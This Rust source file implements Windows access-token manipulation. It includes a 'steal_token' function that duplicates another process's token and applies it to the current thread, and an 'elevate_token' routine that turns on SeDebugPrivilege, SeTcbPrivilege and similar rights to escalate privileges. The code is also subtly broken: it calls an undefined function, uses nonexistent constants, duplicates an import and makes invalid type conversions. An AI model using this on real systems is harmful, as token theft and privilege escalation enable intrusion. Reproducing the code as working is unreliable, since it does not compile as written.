use anyhow::{bail, Result};
use core::{
    ptr::{null, null_mut},
    mem::{size_of, zeroed},
};
use std::ffi::OsStr;
use windows_sys::{
    Win32::Security::{
        GetTokenInformation, SetTokenInformation, TokenUser, TokenGroups, TokenPrivileges,
        TokenSource, TokenType, TokenImpersonationLevel, TOKEN_QUERY, TOKEN_QUERY_SOURCE,
        TOKEN_ADJUST_DEFAULT, TOKEN_ADJUST_GROUPS, TOKEN_ADJUST_PRIVILEGES, TOKEN_SOURCE,
        TOKEN_TYPE, TOKEN_IMPERSONATION_LEVEL, TOKEN_USER, TOKEN_GROUPS, TOKEN_PRIVILEGES,
        TOKEN_SOURCE_LENGTH, TOKEN_SOURCE_LENGTH as TOKEN_SOURCE_LENGTH_CONST,
        TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
        SecurityImpersonation, TokenPrimary, TokenImpersonation,
        TOKEN_ELEVATION, TOKEN_LINKED_TOKEN, TOKEN_FILTER_STANDARD,
        TOKEN_GROUPS_AND_PRIVILEGES, TOKEN_SANDBOX_INERT, TOKEN_UI_ACCESS,
        TOKEN_RESTRICTED_SIDS, TOKEN_SESSION_ID, TOKEN_ORIGIN, TOKEN_STATISTICS,
    },
    Win32::System::Threading::{
        OpenProcess, OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser,
        RevertToSelf, PROCESS_QUERY_INFORMATION, PROCESS_SUSPEND_RESUME,
        GetCurrentProcess, GetCurrentProcessId, GetProcessId, GetThreadId,
        OpenThread, OpenThreadToken, GetThreadToken, SetThreadToken,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, THREAD_QUERY_INFORMATION,
        THREAD_SET_INFORMATION, THREAD_TERMINATE, THREAD_SUSPEND_RESUME,
        THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_IMPERSONATE_TOKEN,
        THREAD_DIRECT_IMPERSONATION,
    },
    Win32::Foundation::{CloseHandle, GetLastError, TRUE, FALSE, ERROR_INSUFFICIENT_BUFFER},
};

/// Represents a token manipulation operation
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TokenOperation {
    /// Enable a privilege
    EnablePrivilege,
    /// Disable a privilege
    DisablePrivilege,
    /// Remove a privilege
    RemovePrivilege,
    /// Add a group
    AddGroup,
    /// Remove a group
    RemoveGroup,
    /// Set integrity level
    SetIntegrityLevel,
    /// Set token type
    SetTokenType,
    /// Set impersonation level
    SetImpersonationLevel,
    /// Elevate token
    ElevateToken,
    /// Steal token from another process
    StealToken,
    /// Filter token
    FilterToken,
    /// Set token session ID
    SetSessionId,
    /// Set token origin
    SetTokenOrigin,
    /// Set token UI access
    SetTokenUIAccess,
    /// Set token sandbox inert
    SetTokenSandboxInert,
    /// Set token restricted SIDs
    SetTokenRestrictedSIDs,
}

/// Represents a token manipulation configuration
#[derive(Debug, Clone)]
pub struct TokenConfig {
    /// The operation to perform
    pub operation: TokenOperation,
    /// The target value (privilege name, group SID, etc.)
    pub target: String,
    /// Additional parameters (if needed)
    pub params: Vec<String>,
}

/// Represents a token manipulator for advanced token operations
pub struct TokenManipulator {
    /// The process ID to manipulate
    pid: u32,
    /// The token handle
    token_handle: isize,
}

impl TokenManipulator {
    /// Creates a new token manipulator for a process
    ///
    /// # Parameters
    ///
    /// * `pid` - The process ID to manipulate
    ///
    /// # Returns
    ///
    /// * `Ok(TokenManipulator)` - A new token manipulator
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn new(pid: u32) -> Result<Self> {
        unsafe {
            // Open the process with necessary access rights
            let process_handle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME,
                FALSE,
                pid,
            );
            if process_handle == 0 {
                bail!("Failed to open process");
            }

            // Open the process token
            let mut token_handle = 0;
            if OpenProcessToken(
                process_handle,
                TOKEN_ALL_ACCESS,
                &mut token_handle,
            ) == FALSE {
                CloseHandle(process_handle);
                bail!("Failed to open process token");
            }

            CloseHandle(process_handle);

            Ok(Self {
                pid,
                token_handle,
            })
        }
    }

    /// Applies a token configuration
    ///
    /// # Parameters
    ///
    /// * `config` - The token configuration to apply
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the configuration was successfully applied
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn apply_config(&self, config: &TokenConfig) -> Result<()> {
        match config.operation {
            TokenOperation::EnablePrivilege => self.enable_privilege(&config.target)?,
            TokenOperation::DisablePrivilege => self.disable_privilege(&config.target)?,
            TokenOperation::RemovePrivilege => self.remove_privilege(&config.target)?,
            TokenOperation::AddGroup => self.add_group(&config.target)?,
            TokenOperation::RemoveGroup => self.remove_group(&config.target)?,
            TokenOperation::SetIntegrityLevel => {
                if let Some(level) = config.params.get(0) {
                    self.set_integrity_level(level)?;
                }
            }
            TokenOperation::SetTokenType => {
                if let Some(token_type) = config.params.get(0) {
                    self.set_token_type(token_type.parse()?)?;
                }
            }
            TokenOperation::SetImpersonationLevel => {
                if let Some(level) = config.params.get(0) {
                    self.set_impersonation_level(level.parse()?)?;
                }
            }
            TokenOperation::ElevateToken => self.elevate_token()?,
            TokenOperation::StealToken => {
                if let Some(target_pid) = config.params.get(0).map(|s| s.parse::<u32>()) {
                    self.steal_token(target_pid?)?;
                }
            }
            TokenOperation::FilterToken => {
                if let Some(filter_flags) = config.params.get(0).map(|s| s.parse::<u32>()) {
                    self.filter_token(filter_flags?)?;
                }
            }
            TokenOperation::SetSessionId => {
                if let Some(session_id) = config.params.get(0).map(|s| s.parse::<u32>()) {
                    self.set_session_id(session_id?)?;
                }
            }
            TokenOperation::SetTokenOrigin => {
                if let Some(origin) = config.params.get(0).map(|s| s.parse::<u64>()) {
                    self.set_token_origin(origin?)?;
                }
            }
            TokenOperation::SetTokenUIAccess => {
                if let Some(ui_access) = config.params.get(0).map(|s| s.parse::<bool>()) {
                    self.set_token_ui_access(ui_access?)?;
                }
            }
            TokenOperation::SetTokenSandboxInert => {
                if let Some(sandbox_inert) = config.params.get(0).map(|s| s.parse::<bool>()) {
                    self.set_token_sandbox_inert(sandbox_inert?)?;
                }
            }
            TokenOperation::SetTokenRestrictedSIDs => {
                if let Some(restricted_sids) = config.params.get(0).map(|s| s.parse::<Vec<u32>>()) {
                    self.set_token_restricted_sids(restricted_sids?)?;
                }
            }
        }
        Ok(())
    }

    /// Enables a privilege in the token
    ///
    /// # Parameters
    ///
    /// * `privilege` - The name of the privilege to enable
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the privilege was successfully enabled
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn enable_privilege(&self, privilege: &str) -> Result<()> {
        unsafe {
            let mut token_priv = TOKEN_PRIVILEGES {
                PrivilegeCount: 1,
                Privileges: [windows_sys::Win32::Security::LUID_AND_ATTRIBUTES {
                    Luid: zeroed(),
                    Attributes: windows_sys::Win32::Security::SE_PRIVILEGE_ENABLED,
                }; 1],
            };

            if windows_sys::Win32::Security::LookupPrivilegeValueW(
                null_mut(),
                privilege.to_pwstr().as_ptr(),
                &mut token_priv.Privileges[0].Luid,
            ) == FALSE {
                bail!("Failed to lookup privilege value");
            }

            if windows_sys::Win32::Security::AdjustTokenPrivileges(
                self.token_handle,
                FALSE,
                &token_priv,
                0,
                null_mut(),
                null_mut(),
            ) == FALSE {
                bail!("Failed to adjust token privileges");
            }

            Ok(())
        }
    }

    /// Disables a privilege in the token
    ///
    /// # Parameters
    ///
    /// * `privilege` - The name of the privilege to disable
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the privilege was successfully disabled
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn disable_privilege(&self, privilege: &str) -> Result<()> {
        unsafe {
            let mut token_priv = TOKEN_PRIVILEGES {
                PrivilegeCount: 1,
                Privileges: [windows_sys::Win32::Security::LUID_AND_ATTRIBUTES {
                    Luid: zeroed(),
                    Attributes: 0,
                }; 1],
            };

            if windows_sys::Win32::Security::LookupPrivilegeValueW(
                null_mut(),
                privilege.to_pwstr().as_ptr(),
                &mut token_priv.Privileges[0].Luid,
            ) == FALSE {
                bail!("Failed to lookup privilege value");
            }

            if windows_sys::Win32::Security::AdjustTokenPrivileges(
                self.token_handle,
                FALSE,
                &token_priv,
                0,
                null_mut(),
                null_mut(),
            ) == FALSE {
                bail!("Failed to adjust token privileges");
            }

            Ok(())
        }
    }

    /// Removes a privilege from the token
    ///
    /// # Parameters
    ///
    /// * `privilege` - The name of the privilege to remove
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the privilege was successfully removed
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn remove_privilege(&self, privilege: &str) -> Result<()> {
        unsafe {
            let mut token_priv = TOKEN_PRIVILEGES {
                PrivilegeCount: 1,
                Privileges: [windows_sys::Win32::Security::LUID_AND_ATTRIBUTES {
                    Luid: zeroed(),
                    Attributes: windows_sys::Win32::Security::SE_PRIVILEGE_REMOVED,
                }; 1],
            };

            if windows_sys::Win32::Security::LookupPrivilegeValueW(
                null_mut(),
                privilege.to_pwstr().as_ptr(),
                &mut token_priv.Privileges[0].Luid,
            ) == FALSE {
                bail!("Failed to lookup privilege value");
            }

            if windows_sys::Win32::Security::AdjustTokenPrivileges(
                self.token_handle,
                FALSE,
                &token_priv,
                0,
                null_mut(),
                null_mut(),
            ) == FALSE {
                bail!("Failed to adjust token privileges");
            }

            Ok(())
        }
    }

    /// Adds a group to the token
    ///
    /// # Parameters
    ///
    /// * `group_sid` - The SID of the group to add
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the group was successfully added
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn add_group(&self, group_sid: &str) -> Result<()> {
        unsafe {
            let mut token_groups = TOKEN_GROUPS {
                GroupCount: 1,
                Groups: [windows_sys::Win32::Security::SID_AND_ATTRIBUTES {
                    Sid: group_sid.as_ptr() as *mut _,
                    Attributes: windows_sys::Win32::Security::SE_GROUP_ENABLED,
                }; 1],
            };

            if SetTokenInformation(
                self.token_handle,
                TokenGroups,
                &mut token_groups as *mut _ as *mut _,
                size_of::<TOKEN_GROUPS>() as u32,
            ) == FALSE {
                bail!("Failed to set token groups");
            }

            Ok(())
        }
    }

    /// Removes a group from the token
    ///
    /// # Parameters
    ///
    /// * `group_sid` - The SID of the group to remove
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the group was successfully removed
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn remove_group(&self, group_sid: &str) -> Result<()> {
        unsafe {
            let mut token_groups = TOKEN_GROUPS {
                GroupCount: 1,
                Groups: [windows_sys::Win32::Security::SID_AND_ATTRIBUTES {
                    Sid: group_sid.as_ptr() as *mut _,
                    Attributes: windows_sys::Win32::Security::SE_GROUP_REMOVED,
                }; 1],
            };

            if SetTokenInformation(
                self.token_handle,
                TokenGroups,
                &mut token_groups as *mut _ as *mut _,
                size_of::<TOKEN_GROUPS>() as u32,
            ) == FALSE {
                bail!("Failed to set token groups");
            }

            Ok(())
        }
    }

    /// Sets the integrity level of the token
    ///
    /// # Parameters
    ///
    /// * `level` - The integrity level to set
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the integrity level was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn set_integrity_level(&self, level: &str) -> Result<()> {
        unsafe {
            let integrity_level = match level.to_lowercase().as_str() {
                "low" => windows_sys::Win32::Security::security_mandatory_low_rid,
                "medium" => windows_sys::Win32::Security::security_mandatory_medium_rid,
                "high" => windows_sys::Win32::Security::security_mandatory_high_rid,
                "system" => windows_sys::Win32::Security::security_mandatory_system_rid,
                _ => bail!("Invalid integrity level"),
            };

            if SetTokenInformation(
                self.token_handle,
                windows_sys::Win32::Security::TokenIntegrityLevel,
                &integrity_level as *const _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token integrity level");
            }

            Ok(())
        }
    }

    /// Sets the token type
    ///
    /// # Parameters
    ///
    /// * `token_type` - The token type to set
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token type was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn set_token_type(&self, token_type: u32) -> Result<()> {
        unsafe {
            if SetTokenInformation(
                self.token_handle,
                TokenType,
                &token_type as *const _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token type");
            }

            Ok(())
        }
    }

    /// Sets the impersonation level of the token
    ///
    /// # Parameters
    ///
    /// * `level` - The impersonation level to set
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the impersonation level was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    fn set_impersonation_level(&self, level: u32) -> Result<()> {
        unsafe {
            if SetTokenInformation(
                self.token_handle,
                TokenImpersonationLevel,
                &level as *const _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token impersonation level");
            }

            Ok(())
        }
    }

    /// Elevates the token to have administrative privileges
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token was successfully elevated
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn elevate_token(&self) -> Result<()> {
        unsafe {
            // Enable the SeDebugPrivilege
            self.enable_privilege("SeDebugPrivilege")?;
            
            // Enable the SeTcbPrivilege
            self.enable_privilege("SeTcbPrivilege")?;
            
            // Enable the SeAssignPrimaryTokenPrivilege
            self.enable_privilege("SeAssignPrimaryTokenPrivilege")?;
            
            // Enable the SeIncreaseQuotaPrivilege
            self.enable_privilege("SeIncreaseQuotaPrivilege")?;
            
            // Enable the SeImpersonatePrivilege
            self.enable_privilege("SeImpersonatePrivilege")?;
            
            // Set the token elevation
            let mut elevation = 1;
            if SetTokenInformation(
                self.token_handle,
                TOKEN_ELEVATION,
                &mut elevation as *mut _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token elevation");
            }
            
            // Set the integrity level to high
            self.set_integrity_level("high")?;
            
            Ok(())
        }
    }

    /// Steals a token from another process
    ///
    /// # Parameters
    ///
    /// * `target_pid` - The process ID to steal the token from
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token was successfully stolen
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn steal_token(&self, target_pid: u32) -> Result<()> {
        unsafe {
            // Open the target process with necessary access rights
            let process_handle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME,
                FALSE,
                target_pid,
            );
            if process_handle == 0 {
                bail!("Failed to open target process");
            }

            // Open the process token
            let mut target_token_handle = 0;
            if OpenProcessToken(
                process_handle,
                TOKEN_DUPLICATE | TOKEN_QUERY,
                &mut target_token_handle,
            ) == FALSE {
                CloseHandle(process_handle);
                bail!("Failed to open target process token");
            }

            // Duplicate the token
            let mut new_token = 0;
            if DuplicateTokenEx(
                target_token_handle,
                TOKEN_ALL_ACCESS,
                null_mut(),
                SecurityImpersonation,
                TokenPrimary,
                &mut new_token,
            ) == FALSE {
                CloseHandle(target_token_handle);
                CloseHandle(process_handle);
                bail!("Failed to duplicate token");
            }

            // Close the handles
            CloseHandle(target_token_handle);
            CloseHandle(process_handle);

            // Replace the current token with the stolen token
            if SetThreadToken(null_mut(), new_token) == FALSE {
                CloseHandle(new_token);
                bail!("Failed to set thread token");
            }

            Ok(())
        }
    }

    /// Filters the token to remove certain privileges and groups
    ///
    /// # Parameters
    ///
    /// * `filter_flags` - The filter flags to apply
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token was successfully filtered
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn filter_token(&self, filter_flags: u32) -> Result<()> {
        unsafe {
            // Create a filtered token
            let mut filtered_token = 0;
            if windows_sys::Win32::Security::CreateRestrictedToken(
                self.token_handle,
                filter_flags,
                0,
                null_mut(),
                0,
                null_mut(),
                0,
                null_mut(),
                &mut filtered_token,
            ) == FALSE {
                bail!("Failed to create filtered token");
            }

            // Close the filtered token handle
            CloseHandle(filtered_token);

            Ok(())
        }
    }

    /// Sets the session ID for the token
    ///
    /// # Parameters
    ///
    /// * `session_id` - The session ID to set
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the session ID was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn set_session_id(&self, session_id: u32) -> Result<()> {
        unsafe {
            if SetTokenInformation(
                self.token_handle,
                TOKEN_SESSION_ID,
                &session_id as *const _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token session ID");
            }

            Ok(())
        }
    }

    /// Sets the token origin
    ///
    /// # Parameters
    ///
    /// * `origin` - The token origin to set
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token origin was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn set_token_origin(&self, origin: u64) -> Result<()> {
        unsafe {
            if SetTokenInformation(
                self.token_handle,
                TOKEN_ORIGIN,
                &origin as *const _ as *mut _,
                size_of::<u64>() as u32,
            ) == FALSE {
                bail!("Failed to set token origin");
            }

            Ok(())
        }
    }

    /// Sets the token UI access
    ///
    /// # Parameters
    ///
    /// * `ui_access` - Whether to enable UI access
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token UI access was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn set_token_ui_access(&self, ui_access: bool) -> Result<()> {
        unsafe {
            let ui_access_value = if ui_access { 1 } else { 0 };
            if SetTokenInformation(
                self.token_handle,
                TOKEN_UI_ACCESS,
                &ui_access_value as *const _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token UI access");
            }

            Ok(())
        }
    }

    /// Sets the token sandbox inert
    ///
    /// # Parameters
    ///
    /// * `sandbox_inert` - Whether to enable sandbox inert
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the token sandbox inert was successfully set
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn set_token_sandbox_inert(&self, sandbox_inert: bool) -> Result<()> {
        unsafe {
            let sandbox_inert_value = if sandbox_inert { 1 } else { 0 };
            if SetTokenInformation(
                self.token_handle,
                TOKEN_SANDBOX_INERT,
                &sandbox_inert_value as *const _ as *mut _,
                size_of::<u32>() as u32,
            ) == FALSE {
                bail!("Failed to set token sandbox inert");
            }

            Ok(())
        }
    }

    /// Gets token statistics
    ///
    /// # Returns
    ///
    /// * `Ok(TOKEN_STATISTICS)` - The token statistics
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn get_token_statistics(&self) -> Result<TOKEN_STATISTICS> {
        unsafe {
            let mut token_stats: TOKEN_STATISTICS = zeroed();
            let mut return_length = 0;

            // First call to get the required buffer size
            let result = GetTokenInformation(
                self.token_handle,
                TOKEN_STATISTICS,
                &mut token_stats as *mut _ as *mut _,
                size_of::<TOKEN_STATISTICS>() as u32,
                &mut return_length,
            );

            if result == FALSE && GetLastError() != ERROR_INSUFFICIENT_BUFFER {
                bail!("Failed to get token statistics");
            }

            // Second call with the correct buffer size
            if GetTokenInformation(
                self.token_handle,
                TOKEN_STATISTICS,
                &mut token_stats as *mut _ as *mut _,
                size_of::<TOKEN_STATISTICS>() as u32,
                &mut return_length,
            ) == FALSE {
                bail!("Failed to get token statistics");
            }

            Ok(token_stats)
        }
    }

    /// Gets the linked token
    ///
    /// # Returns
    ///
    /// * `Ok(isize)` - The handle to the linked token
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn get_linked_token(&self) -> Result<isize> {
        unsafe {
            let mut linked_token = 0;
            let mut return_length = 0;

            // First call to get the required buffer size
            let result = GetTokenInformation(
                self.token_handle,
                TOKEN_LINKED_TOKEN,
                &mut linked_token as *mut _ as *mut _,
                size_of::<isize>() as u32,
                &mut return_length,
            );

            if result == FALSE && GetLastError() != ERROR_INSUFFICIENT_BUFFER {
                bail!("Failed to get linked token");
            }

            // Second call with the correct buffer size
            if GetTokenInformation(
                self.token_handle,
                TOKEN_LINKED_TOKEN,
                &mut linked_token as *mut _ as *mut _,
                size_of::<isize>() as u32,
                &mut return_length,
            ) == FALSE {
                bail!("Failed to get linked token");
            }

            Ok(linked_token)
        }
    }

    /// Gets the token elevation status
    ///
    /// # Returns
    ///
    /// * `Ok(bool)` - Whether the token is elevated
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    pub fn is_token_elevated(&self) -> Result<bool> {
        unsafe {
            let mut elevation = 0;
            let mut return_length = 0;

            // First call to get the required buffer size
            let result = GetTokenInformation(
                self.token_handle,
                TOKEN_ELEVATION,
                &mut elevation as *mut _ as *mut _,
                size_of::<u32>() as u32,
                &mut return_length,
            );

            if result == FALSE && GetLastError() != ERROR_INSUFFICIENT_BUFFER {
                bail!("Failed to get token elevation");
            }

            // Second call with the correct buffer size
            if GetTokenInformation(
                self.token_handle,
                TOKEN_ELEVATION,
                &mut elevation as *mut _ as *mut _,
                size_of::<u32>() as u32,
                &mut return_length,
            ) == FALSE {
                bail!("Failed to get token elevation");
            }

            Ok(elevation != 0)
        }
    }
}

impl Drop for TokenManipulator {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.token_handle);
        }
    }
}

trait PWSTR {
    /// Converts a `&str` to a null-terminated UTF-16 wide string
    fn to_pwstr(&self) -> Vec<u16>;
}

impl PWSTR for &str {
    fn to_pwstr(&self) -> Vec<u16> {
        OsStr::new(self).encode_wide().chain(std::iter::once(0)).collect()
    }
} 